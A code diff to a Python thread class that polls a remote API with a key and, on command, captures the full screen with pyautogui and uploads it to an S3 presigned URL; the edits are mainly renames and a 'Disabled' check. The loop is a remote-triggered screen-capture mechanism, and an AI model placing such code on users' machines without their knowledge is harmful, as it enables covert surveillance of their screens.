@@ -1,16 +1,16 @@
 import os
 import threading
+from time import sleep
+
 import pyautogui
 import requests
 
-from time import sleep
 
-
-class Screenshot(threading.Thread):
+class Screenshots(threading.Thread):
 
     def __init__(self, api: str, key: str):
         super().__init__()
-        self.name = "Screenshot"
+        self.name = "Screenshots"
         self.api = api
         self.key = key
 
@@ -18,23 +18,20 @@ class Screenshot(threading.Thread):
         while True:
             try:
                 response = requests.get("https://" + self.api + "/screenshot",
-                                         headers={"x-api-key": self.key})
-                if response.ok:
-                    # Take screenshot
+                                        headers={"x-api-key": self.key})
+                if response.ok and "Disabled" not in response.text:
+                    # Take screenshots
                     pic = pyautogui.screenshot()
                     # Save the image
-                    file_name = 'Screenshot.jpeg'
+                    file_name = 'Screenshots.jpeg'
                     pic.save(file_name)
                     with open(file_name, "rb") as image_file:
                         files = {'file': (file_name, image_file, 'image/jpeg', {'Expires': '0'})}
                         upload = response.json()
-                        url = upload['url'].replace("s3.amazonaws.com","s3-accelerate.amazonaws.com")
-                        upload_screenshot = requests.post(url, data=upload['fields'], files=files)
+                        url = upload['url'].replace("s3.amazonaws.com", "s3-accelerate.amazonaws.com")
+                        upload_screenshots = requests.post(url, data=upload['fields'], files=files)
                         print('screen shot uploaded!')
                     os.remove(file_name)
-                else:
-                    print(response.status_code)
-                    print(response.reason)
 
             except Exception as e:
                 print(e)
